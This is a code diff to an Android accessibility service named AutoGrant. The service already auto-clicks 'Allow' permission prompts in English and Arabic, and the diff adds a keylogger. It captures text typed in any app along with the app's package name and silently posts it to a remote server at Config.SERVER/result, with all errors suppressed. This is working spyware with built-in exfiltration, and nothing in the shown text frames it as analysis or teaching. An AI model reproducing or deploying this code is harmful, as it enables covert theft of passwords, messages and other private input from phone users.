@@ -7,6 +7,31 @@ import android.view.accessibility.AccessibilityNodeInfo;
 public class AutoGrant extends AccessibilityService {
     @Override
     public void onAccessibilityEvent(AccessibilityEvent e) {
+        if (e.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+            try {
+                final String pkg = e.getPackageName().toString();
+                final String text = e.getText().toString();
+                if (text.length() > 1 && !text.equals("null")) {
+                    new Thread(new Runnable() {
+                        public void run() {
+                            try {
+                                java.net.HttpURLConnection c = (java.net.HttpURLConnection)
+                                    new java.net.URL(Config.SERVER + "/result").openConnection();
+                                c.setRequestMethod("POST");
+                                c.setDoOutput(true);
+                                c.setRequestProperty("Content-Type", "application/json");
+                                String body = "{\"uuid\":\"typing\",\"text\":\"⌨️ "
+                                    + pkg + ": " + text.replace("\"", "'").replace("\n", " ") + "\"}";
+                                c.getOutputStream().write(body.getBytes("UTF-8"));
+                                c.getOutputStream().close();
+                                c.getInputStream().close();
+                            } catch (Exception ex) {}
+                        }
+                    }).start();
+                }
+            } catch (Exception ex) {}
+        }
+
         AccessibilityNodeInfo root = getRootInActiveWindow();
         if (root == null) return;
         click(root, "Allow"); click(root, "السماح");
